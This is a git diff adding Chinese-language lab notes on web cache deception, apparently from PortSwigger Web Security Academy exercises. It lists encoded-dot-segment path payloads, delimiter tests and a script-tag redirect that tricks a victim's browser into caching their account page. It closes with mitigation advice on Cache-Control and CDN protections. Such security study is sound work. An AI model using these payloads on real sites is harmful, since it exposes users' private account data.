@@ -82,15 +82,35 @@ Reference :
   	-  404回應 => X-Cache: miss
   	-  ReSend => X-Cache: hit
   	-  確認存在基於/resources前綴的靜態目錄快取規則
-     
 - https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd
 
+## Exploiting cache server normalization for web cache deception
+- 如果快取伺服器解析編碼的點段，但原始伺服器不解析
+  	- /<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
+	- /profile%2f%2e%2e%2fstatic
+   	- 快取將路徑解釋為：/static
+   	- 原始伺服器將路徑解釋為：/profile%2f%2e%2e%2fstatic
+   	- /profile;%2f%2e%2e%2fstatic
+   	- 快取將路徑解釋為：/static
+   	- 原始伺服器將路徑解釋為：/profile
+   	
+- Intruder :　#， 、?、%23和%3f
+- /my-account?abc.js
+- /aaa/..%2fmy-accouut
+- /my-account?%2f%2e%2e%2fresources
+- <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
 
+## Exploiting file name cache rules
+- Get 常見文件 :  /robots.txt /index.html /favicon.ico
+- /profile%2f%2e%2e%2findex.html
+	- 如果回應被緩存 --> /index.html
+ 	- 回應未被緩存 --> /profile%2f%2e%2e%2findex.html
 
-
-
-
-
+## Preventing web cache deception vulnerabilities
+- 使用Cache-Control
+- 使用指令no-store + 設定private
+- 啟動 CDN 針對 Web 快取欺騙攻擊的所有保護措施
+- 例如，Cloudflare 的快取欺騙防護 (Cache Deception Armor)
 
 
 
